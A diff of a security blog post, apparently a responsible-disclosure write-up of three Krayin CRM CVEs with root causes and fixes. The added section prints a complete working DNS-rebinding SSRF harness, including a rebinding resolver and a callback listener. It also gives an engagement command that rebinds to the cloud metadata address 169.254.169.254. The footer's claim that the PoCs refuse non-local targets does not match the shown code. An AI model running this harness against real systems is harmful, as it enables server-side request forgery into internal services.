+<p>Use <code>--cookie</code> instead of the login options for a captured session. The script is
+non-destructive by default; <code>--no-restore</code> deliberately leaves the email in Trash and
+should not be used for routine validation. The repository PoC
+(<code>CVE-2026-112287.py</code>) never hard-deletes or issues bulk operations; see the
+<a href="https://github.com/0xAdham1/krayin-crm-2.2.7-POC">GitHub PoC repository</a>.</p>
 <h3>Fix: remediation and why it's a distinct CVE</h3>
 <p>Apply the ownership gate the read path already uses to every mutating action:</p>
 <pre><code class="language-php">$email = $this-&gt;emailRepository-&gt;findOrFail($id);
 $this-&gt;preventUnauthorizedAccess(array_filter([
-    $email-&gt;lead?-&gt;user_id,
-    $email-&gt;person?-&gt;user_id,
+    $email-&gt;lead?-&gt;user_id,
+    $email-&gt;person?-&gt;user_id,
 ]));
 </code></pre>
 <p>Route the bulk IDs through <code>filterAuthorizedRecords()</code>, and drop the <code>request('id') ?? $id</code><br />
@@ -490,16 +910,16 @@ guard non-deterministically.</p>
 <h3>Deep dive: the TOCTOU, and what the guard <em>does</em> get right</h3>
 <pre><code class="language-php">// isSafeEndpoint(): validate
 foreach ($ips as $ip) {
-    if (! filter_var($ip, FILTER_VALIDATE_IP,
-            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
-        return false;  // validated at time T0
-    }
+    if (! filter_var($ip, FILTER_VALIDATE_IP,
+            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+        return false;  // validated at time T0
+    }
 }
 return true;
 
 // ...later, triggerWebhook(): use
 $response = $this-&gt;client-&gt;request($method, $data['end_point'], $options);
-//                           ^ Guzzle re-resolves the HOST at T1 (&gt; T0)
+//                           ^ Guzzle re-resolves the HOST at T1 (&gt; T0)
 </code></pre>
 <p><strong>Scope it honestly, the guard isn't useless.</strong> It re-checks inside the <code>on_redirect</code><br />
 handler, so the redirect-based pivot is closed; and decimal/octal IP literals fail<br />
@@ -510,21 +930,163 @@ secondary gap: <code>FILTER_FLAG_NO_RES_RANGE</code> doesn't reliably flag IPv4-
 reflected read: exfiltration needs an internal service that acts on the request alone, or an<br />
 oracle. That's why it's Low (3.1, <code>AC:H</code>, blind), not a straight critical metadata read.</p>
 <h3>PoC: loopback rebinding harness</h3>
-<p>The whole chain runs on loopback: a rebinding DNS server on <code>127.0.0.1:5353</code> that answers<br />
-public on query #1 and <code>127.0.0.1</code> on every query after (TTL 0), plus a loopback listener<br />
-standing in for the internal service. Driving the repo's unmodified <code>isSafeEndpoint()</code> with<br />
-the real client options:</p>
-<pre><code class="language-text">isSafeEndpoint('http://rebind.test/') =&gt; true
-  -&gt; filter said SAFE (it resolved the PUBLIC answer)
-
-HTTP 200   body: INTERNAL-SECRET-RESPONSE
-&gt;&gt;&gt; Guzzle connected to the LOOPBACK target (127.0.0.1) &lt;&lt;&lt;
-
-[dns] A query #1 for rebind.test -&gt; 93.184.216.34
-[dns] A query #2 for rebind.test -&gt; 127.0.0.1
+<p>The repository PoC provides a local self-test for the rebinding resolver, followed by an
+engagement mode that runs the authoritative DNS server and callback listener:</p>
+<pre><code class="language-bash"># prove the resolver returns public on query #1 and loopback on query #2
+python3 CVE-2026-112288.py --selftest
 </code></pre>
-<p>The guard said "public, safe" and the request still hit <code>127.0.0.1</code>. That's the whole bug in<br />
-one trace.</p>
+<details>
+<summary>View the complete <code>CVE-2026-112288.py</code> source</summary>
+<pre><code class="language-python">import argparse
+import datetime
+import socket
+import socketserver
+import struct
+import sys
+import threading
+import time
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+STATE = {&quot;n&quot;: 0, &quot;public&quot;: b&quot;&quot;, &quot;rebind&quot;: b&quot;&quot;, &quot;label&quot;: &quot;&quot;}
+HITS = []
+
+
+def ip_bytes(dotted):
+    try:
+        return socket.inet_aton(dotted)
+    except OSError:
+        sys.exit(f&quot;invalid IPv4: {dotted}&quot;)
+
+
+def ts():
+    return datetime.datetime.now(datetime.timezone.utc).isoformat()
+
+
+class RebindDNS(socketserver.BaseRequestHandler):
+    def handle(self):
+        data, sock = self.request
+        if len(data) &lt; 12:
+            return
+        tid, q = data[:2], data[12:]
+        try:
+            off = 0
+            while q[off] != 0:
+                off += 1 + q[off]
+            qtype = struct.unpack(&quot;&gt;H&quot;, q[off + 1:off + 3])[0]
+        except Exception:
+            qtype = 1
+        if qtype != 1:  # only A queries get the rebind logic
+            sock.sendto(tid + b&quot;\x81\x80\x00\x01\x00\x00\x00\x00\x00\x00&quot; + q, self.client_address)
+            return
+        STATE[&quot;n&quot;] += 1
+        ip = STATE[&quot;public&quot;] if STATE[&quot;n&quot;] == 1 else STATE[&quot;rebind&quot;]
+        which = &quot;PUBLIC (passes guard)&quot; if STATE[&quot;n&quot;] == 1 else f&quot;REBIND -&gt; {STATE[&#x27;label&#x27;]}&quot;
+        ans = tid + b&quot;\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00&quot; + q
+        ans += b&quot;\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04&quot; + ip  # TTL 0
+        sock.sendto(ans, self.client_address)
+        print(f&quot;[dns]  {ts()}  A query #{STATE[&#x27;n&#x27;]} -&gt; {socket.inet_ntoa(ip)}  ({which})&quot;)
+
+
+class Callback(BaseHTTPRequestHandler):
+    server_version = &quot;nginx&quot;
+
+    def _record(self):
+        hit = {&quot;ts&quot;: ts(), &quot;src&quot;: self.client_address[0], &quot;method&quot;: self.command,
+               &quot;path&quot;: self.path, &quot;host_header&quot;: self.headers.get(&quot;Host&quot;)}
+        HITS.append(hit)
+        print(f&quot;[http] {ts()}  &lt;-- SSRF HIT  {self.command} {self.path}  &quot;
+              f&quot;Host={hit[&#x27;host_header&#x27;]}  from {hit[&#x27;src&#x27;]}&quot;)
+        self.send_response(200)
+        self.send_header(&quot;Content-Type&quot;, &quot;text/plain&quot;)
+        self.end_headers()
+        self.wfile.write(b&quot;ssrf-callback-ok\n&quot;)
+
+    do_GET = do_POST = do_PUT = _record
+
+    def log_message(self, *a):
+        pass
+
+
+def selftest(domain, dns_port):
+    print(f&quot;[selftest] querying 127.0.0.1:{dns_port} twice for {domain}&quot;)
+    qname = b&quot;&quot;.join(bytes([len(p)]) + p.encode() for p in domain.split(&quot;.&quot;)) + b&quot;\x00&quot;
+    query = struct.pack(&quot;&gt;HHHHHH&quot;, 0x1234, 0x0100, 1, 0, 0, 0) + qname + struct.pack(&quot;&gt;HH&quot;, 1, 1)
+    for i in range(2):
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(3)
+        s.sendto(query, (&quot;127.0.0.1&quot;, dns_port))
+        resp, _ = s.recvfrom(512)
+        print(f&quot;[selftest] answer #{i + 1}: {socket.inet_ntoa(resp[-4:])}&quot;)
+        s.close()
+    print(&quot;[selftest] #1 public + #2 rebind =&gt; the resolver rebinds correctly.&quot;)
+
+
+def main():
+    ap = argparse.ArgumentParser(description=&quot;CVE-2026-112288 Krayin webhook SSRF rebinding harness&quot;)
+    ap.add_argument(&quot;--domain&quot;, default=&quot;rebind.test&quot;, help=&quot;hostname you delegate to this resolver&quot;)
+    ap.add_argument(&quot;--public&quot;, default=&quot;93.184.216.34&quot;, help=&quot;public IP returned to the guard (answer #1)&quot;)
+    ap.add_argument(&quot;--rebind&quot;, default=&quot;127.0.0.1&quot;, help=&quot;IP returned to the client (answer #2+); in-scope per ROE&quot;)
+    ap.add_argument(&quot;--bind&quot;, default=&quot;127.0.0.1&quot;, help=&quot;interface to bind (0.0.0.0 for a reachable resolver)&quot;)
+    ap.add_argument(&quot;--dns-port&quot;, type=int, default=5353)
+    ap.add_argument(&quot;--listen-port&quot;, type=int, default=8081)
+    ap.add_argument(&quot;--token&quot;, default=&quot;&quot;, help=&quot;optional path token to disambiguate callbacks&quot;)
+    ap.add_argument(&quot;--selftest&quot;, action=&quot;store_true&quot;, help=&quot;prove the rebind locally, then exit&quot;)
+    args = ap.parse_args()
+
+    STATE[&quot;public&quot;] = ip_bytes(args.public)
+    STATE[&quot;rebind&quot;] = ip_bytes(args.rebind)
+    STATE[&quot;label&quot;] = args.rebind
+
+    socketserver.UDPServer.allow_reuse_address = True
+    try:
+        dns = socketserver.UDPServer((args.bind, args.dns_port), RebindDNS)
+    except PermissionError:
+        sys.exit(f&quot;binding {args.bind}:{args.dns_port} needs privileges; use sudo or a high --dns-port&quot;)
+    threading.Thread(target=dns.serve_forever, daemon=True).start()
+    print(f&quot;[dns]  rebinding resolver on {args.bind}:{args.dns_port}  &quot;
+          f&quot;(#1 {args.public} -&gt; #2+ {args.rebind}, TTL 0) for {args.domain}&quot;)
+
+    if args.selftest:
+        time.sleep(0.2)
+        selftest(args.domain, args.dns_port)
+        return
+
+    httpd = ThreadingHTTPServer((args.bind, args.listen_port), Callback)
+    threading.Thread(target=httpd.serve_forever, daemon=True).start()
+    path = f&quot;/{args.token}&quot; if args.token else &quot;/&quot;
+    print(f&quot;[http] callback listener on {args.bind}:{args.listen_port}&quot;)
+    print(f&quot;\nRegister a Krayin webhook (GET http://{args.domain}:{args.listen_port}{path}),&quot;)
+    print(&quot;wire it to a workflow, then trigger the event. Watching for the hit; Ctrl-C to stop.\n&quot;)
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print(f&quot;\n[done] {len(HITS)} callback hit(s) recorded.&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+</details>
+<pre><code class="language-text">[dns]  rebinding resolver on 127.0.0.1:5353  (#1 93.184.216.34 -&gt; #2+ 127.0.0.1, TTL 0) for rebind.test
+[selftest] querying 127.0.0.1:5353 twice for rebind.test
+[dns]  A query #1 -&gt; 93.184.216.34  (PUBLIC (passes guard))
+[selftest] answer #1: 93.184.216.34
+[dns]  A query #2 -&gt; 127.0.0.1  (REBIND -&gt; 127.0.0.1)
+[selftest] answer #2: 127.0.0.1
+[selftest] #1 public + #2 rebind =&gt; the resolver rebinds correctly.
+</code></pre>
+<p>For an authorized integration test, delegate a test domain to the resolver and run the
+callback listener on the target-reachable host:</p>
+<pre><code class="language-bash">sudo python3 CVE-2026-112288.py \
+  --domain ssrf.example --public 203.0.113.10 --rebind 169.254.169.254 \
+  --bind 0.0.0.0 --dns-port 53 --listen-port 80 --token r4nd0m
+</code></pre>
+<p>Register a Krayin webhook using the printed callback URL, trigger the workflow, and treat a
+callback-listener hit as proof that the server-side request reached the rebinding target. This
+is the repository's blind-SSRF harness: it does not read cloud-metadata credentials or act on
+internal services. See <code>CVE-2026-112288.py</code> in the
+<a href="https://github.com/0xAdham1/krayin-crm-2.2.7-POC">GitHub PoC repository</a>.</p>
 <h3>Fix: pin the connection to the validated IP</h3>
 <p>The root cause is the second resolution, so pin the connection to the IP the guard<br />
 validated:</p>
@@ -553,29 +1115,29 @@ gets its own ID: an incomplete-fix of a security control.</p>
 to the vendor before publication and are fixed in Krayin 2.2.7. PoC scripts are read-only or<br />
 reversible and refuse non-local targets. Test only against systems you own or are authorised<br />
 to assess.</em></p>
-        </article>
-        <aside class="article-aside">
-          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
-          <h2>Clear. Scoped. Reproducible.</h2>
-          <p>A white-box review of Krayin CRM turned up three CVEs: an incomplete-fix IDOR in the Quote module, a write-path BOLA in Mail, and a DNS-rebinding bypass of the webhook SSRF filter. Root cause, PoCs and fixes for all three, fixed in 2.2.7.</p>
-          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
-            <div><strong style="color:var(--ink)">Published:</strong> 2026-10-19</div>
-            <div><strong style="color:var(--ink)">Category:</strong> Responsible disclosure</div>
-            <div style="margin-top:10px"><strong style="color:var(--ink)">Tags:</strong><div style="margin-top:5px"><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">krayin</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">laravel</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">idor</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">bola</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ssrf</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">dns-rebinding</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">cve</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">appsec</span></div></div>
-          </div>
-          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
-        </aside>
-      </div>
-    </section>
-  </main>
-  <footer class="site-footer">
-    <div class="wrap">
-      <div class="footer-bottom">
-        <span>© 2026 · 0xAdham</span>
-        <a href="/writing/">Return to writing ↑</a>
-      </div>
-    </div>
-  </footer>
-  <script src="/assets/site.js" defer></script>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>A white-box review of Krayin CRM turned up three CVEs: an incomplete-fix IDOR in the Quote module, a write-path BOLA in Mail, and a DNS-rebinding bypass of the webhook SSRF filter. Root cause, PoCs and fixes for all three, fixed in 2.2.7.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-10-19</div>
+            <div><strong style="color:var(--ink)">Category:</strong> Responsible disclosure</div>
+            <div style="margin-top:10px"><strong style="color:var(--ink)">Tags:</strong><div style="margin-top:5px"><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">krayin</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">laravel</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">idor</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">bola</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ssrf</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">dns-rebinding</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">cve</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">appsec</span></div></div>
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
 </body>
 </html>
